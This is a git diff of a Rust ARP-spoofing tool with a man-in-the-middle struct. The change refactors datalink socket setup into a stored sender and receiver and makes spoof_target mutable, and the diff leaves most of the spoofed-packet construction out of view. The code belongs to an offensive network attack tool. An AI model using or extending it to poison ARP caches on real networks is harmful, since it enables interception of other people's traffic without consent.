@@ -1,10 +1,10 @@
-use std::net::Ipv4Addr;
+use std::{net::Ipv4Addr, ptr::null, sync::{Arc, Mutex}};
 
 use nix::sys::socket;
-use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{Arp, ArpHardwareType, ArpOperation, ArpPacket, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel}};
+use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{Arp, ArpHardwareType, ArpOperation, ArpPacket, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}};
 
 pub trait ArpSpoofer {
-    fn spoof_target(&self, ip: Ipv4Addr) -> bool;
+    fn spoof_target(&mut self, ip: Ipv4Addr) -> bool;
 }
 
 pub struct Mitm {
@@ -15,7 +15,10 @@ pub struct Mitm {
 pub struct ArpSpooferImpl {
     interface: NetworkInterface,
     mitm: Mitm,
-    gateway: Ipv4Addr
+    gateway: Ipv4Addr,
+
+    sender: Option<Box<dyn DataLinkSender>>,
+    receiver: Option<Box<dyn DataLinkReceiver>>
 }
 
 impl ArpSpooferImpl {
@@ -24,16 +27,33 @@ impl ArpSpooferImpl {
         mitm: Mitm, 
         gateway: Ipv4Addr
     ) -> Self {
-        Self {
+        let mut result = Self {
             interface: interface,
             mitm: mitm,
-            gateway: gateway
-        }
+            gateway: gateway,
+            sender: None,
+            receiver: None
+        };
+
+        result.setup_socket();
+
+        return result;
+    }
+
+    fn setup_socket(&mut self) {
+        let (tx, rx) = match datalink::channel(&self.interface, Default::default()) {
+            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
+            Ok(_) => panic!("Unhandled channel type"),
+            Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
+        };
+
+        self.sender = Some(tx);
+        self.receiver = Some(rx);
     }
 }
 
 impl ArpSpoofer for ArpSpooferImpl {
-    fn spoof_target(&self, target: Ipv4Addr) -> bool {
+    fn spoof_target(&mut self, target: Ipv4Addr) -> bool {
         // instantiate packet
 
         println!("Spoofing target: {}", target.to_string());
@@ -60,31 +80,23 @@ impl ArpSpoofer for ArpSpooferImpl {
         ethernet_packet.set_payload(arp_packet.packet_mut());
 
         println!("Assembled packets!");
-
-        let (mut tx, mut rx) = match datalink::channel(&self.interface, Default::default()) {
-            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
-            Ok(_) => panic!("Unhandled channel type"),
-            Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
-        };
-
         println!("Preparing to send packet!");
 
-        let send_opt = tx.send_to(ethernet_packet.packet_mut(), None);
+        if let Some(sender) = self.sender.as_mut() {
+            let send_opt = sender.send_to(ethernet_packet.packet_mut(), None);
 
+                if let Some(send_res) = send_opt {
+                    if let Ok(_) = send_res {
+                        println!("Sent packet successfully!");
+                        return true
+                    } else {
+                        println!("Failed on second part!");
+                    }
         
-        if let Some(send_res) = send_opt {
-            
-            if let Ok(_) = send_res {
-                println!("Sent packet successfully!");
-                return true
-            } else {
-                println!("Failed on second part!");
-            }
-
-        } else {
-            println!("Failed on first part!");
+                } else {
+                    println!("Failed on first part!");
+                }   
         }
-
 
         return false;
     }
